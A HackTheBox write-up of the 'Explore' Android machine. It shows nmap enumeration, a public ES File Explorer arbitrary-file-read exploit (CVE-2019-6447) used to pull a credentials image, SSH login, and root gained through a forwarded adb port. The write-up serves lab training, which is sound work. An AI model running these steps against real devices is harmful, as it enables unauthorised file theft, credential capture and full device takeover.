---
title: "HackTheBox: Explore"
date: 2025-03-12 00:00:00 +/-TTTT
categories: [Writeups, HackTheBox, easy]
tags: [htb, easy]     # TAG names should always be lowercase
---

>**Title**: Explore
>
>**Platform**: HackTheBox
>
>**Difficulty**: Easy
>
>**Objective**: Root the box and gain access to the three ingredients to turn Rick back into a human from a pickle.

<img src= "https://labs.hackthebox.com/storage/avatars/2c3df5ec98bea78159400b5b4f6474ab.png" width="250" height="250" alt=logo.png> <br>

[Challenge Link](https://www.hackthebox.com/machines/explore)

 > [!NOTE]
 This writeup does not divulge the flags. 

## Enumeration

We start off with our favorite tool….`nmap` to identify open ports and services.

```bash
┌──(kali㉿kali)-[~/HTB/Explore]
└─$ sudo nmap -sS 10.129.56.63 
[sudo] password for kali: 
Starting Nmap 7.92 ( <https://nmap.org> ) at 2022-09-14 16:43 EDT
Nmap scan report for 10.129.56.63
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE    SERVICE
2222/tcp open     EtherNetIP-1
5555/tcp filtered freeciv

Nmap done: 1 IP address (1 host up) scanned in 1.91 seconds
```

The scan reveals two open ports: `2222` and `5555`. Let’s perform a more detailed scan using `nmap` with service detection and default scripts.

```bash
──(kali㉿kali)-[~/HTB/Explore]
└─$ nmap -sT -sV -sC 10.129.56.63 -p-
Starting Nmap 7.92 ( <https://nmap.org> ) at 2022-09-14 16:50 EDT
Nmap scan report for 10.129.56.63
Host is up (0.035s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).'
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
```

The scan identifies an `SSH` service on port `2222`, `ES File Explorer` running on port `42135`, and `Bukkit JSONAPI` on port `59777`.

Simply searching for the `freeciv` service with the word exploit tacked on returns quite a few exploits, hmmm interesting…

## ES File Explorer Exploit

Going back to our `nmap` result, let’s search for ES File explorer exploit and we see the first hit is an arbitrary file read.

```
ES File Explorer 4.1.9.7.4 - Arbitrary File Read - https://www.exploit-db.com/exploits/50070
```


>!CAUTION: 💡 Always remember to read the exploit code before you use it! 


```bash
┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070.py getDeviceInfo 10.129.56.63

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : VMware Virtual Platform
ftpRoot : /sdcard
ftpPort : 3721
```

We can use a lot of different functions to list files/pictures/videos etc. Going through that we list pictures and find an interesting JPEG.

```bash
┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070.py listPics 10.129.56.63 

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
```

Let’s use the `getFile` function to get the `creds` file and reveal the contents.

```bash
┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070.py getFile 10.129.56.63 /storage/emulated/0/DCIM/creds.jpg

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
```

Et voila, we see a set of credentials we can use for the SSH server. Sticky notes, am I right?

![image2](https://cdn.hashnode.com/res/hashnode/image/upload/v1741792262251/caef0233-bc05-4b89-af50-74028437b391.png)

## SSH Access (User)

Directly ssh’ing into the box gave me an error saying “**No matching host key type found. Their offer: ssh-rsa**”. A quick search helped me fix that problem and we can connect.

```bash
┌──(kali㉿kali)-[~/HTB/Explore]
└─$ ssh -oHostKeyAlgorithms=+ssh-rsa -p 2222 kristi@10.129.56.63
The authenticity of host '[10.129.56.63]:2222 ([10.129.56.63]:2222)' can't be established.
RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.56.63]:2222' (RSA) to the list of known hosts.
Password authentication
(kristi@10.129.56.63) Password: 
:/ $ whoami
u0_a76
```

Navigate to the `sdcard` directory to find `user.txt` or run the find command and grab that flag.

## Privilege Escalation

Let’s look at the open ports on the machine.

```jsx
:/ $ ss -ntlp
State       Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN      0      50           *:59777                    *:*                  
LISTEN      0      8       [::ffff:127.0.0.1]:40389                    *:*                  
LISTEN      0      50           *:2222                     *:*                   users:(("ss",pid=16841,fd=74),("sh",pid=15893,fd=74),("droid.sshserver",pid=3766,fd=74))
LISTEN      0      4            *:5555                     *:*                  
LISTEN      0      10           *:42135                    *:*                  
LISTEN      0      50       [::ffff:10.129.56.63]:38909                    *:*
```

We identified at the start, the port `5555` is a debugging port (`adb`) and doesn’t allow external connections but now we have local access and we can use `ssh` port forwarding to access this port and service.

We reconnect using `ssh -L 5555:`[`localhost:5555`](http://localhost:5555)

From the attacker machine, let’s connect using `adb` and let’s drop into the `adb` shell

```bash
┌──(kali㉿kali)-[~]
└─$ adb -s localhost:5555 shell
x86_64:/ $ whoami                                                                      
shell
x86_64:/ $ su
:/ # whoami
root
```

```bash
:/ # find / -name root.txt 2>/dev/null
/data/root.txt
1|:/ # cat /data/root.txt
f04fc<ROOTFLAGHERE>
```

Done!